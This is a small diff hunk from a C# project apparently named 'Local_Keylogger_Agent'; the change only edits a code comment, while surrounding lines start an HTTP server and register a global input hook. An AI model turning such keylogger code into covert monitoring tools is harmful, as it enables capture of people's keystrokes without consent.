@@ -28,7 +28,7 @@ namespace Local_Keylogger_Agent
             HTTPServer.StartHTTPServer();
         }
 
-        // Subscribe to all global events
+        // Subscribe to all global events in liberary
         private void SubscribeGlobal()
         {
             globalHook = Hook.GlobalEvents();
